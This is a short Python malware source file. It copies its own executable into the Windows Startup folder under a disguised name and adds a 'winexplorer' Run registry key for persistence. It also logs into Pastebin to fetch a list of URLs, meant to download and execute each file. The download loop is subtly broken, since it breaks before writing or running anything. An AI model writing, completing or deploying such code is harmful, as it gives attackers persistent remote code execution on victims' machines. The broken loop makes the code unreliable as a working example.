from shutil import copyfile
from time import sleep
from os import system , environ , path
from sys import executable
from pbwrap import Pastebin
from requests import get
class Mainfun:
	def __init__(self):
		pass
	def reg_windows(self):
		evil_file_location = environ["appdata"] +"\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Wind.exe"
		if not path.exists(evil_file_location):
			copyfile(executable, evil_file_location)
			system('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v winexplorer /t REG_SZ /d "' + evil_file_location + '"')
	def downloadpaste(self,key,username,password,pasteid):
		pb = Pastebin(key)
		pb.authenticate(username,password)
		url_post = pb.get_user_raw_paste(pasteid)
		url_post.splitlines()
		x = []
		for url in url_post.splitlines():
			file_name  = url.split("/")[-1]
			data = get(url).content
			x.append(url)
			if url in x:
				break		
			else :
				f = open(f"{file_name}", 'wb')
				f.write(data)
				f.close()
				system(file_name)

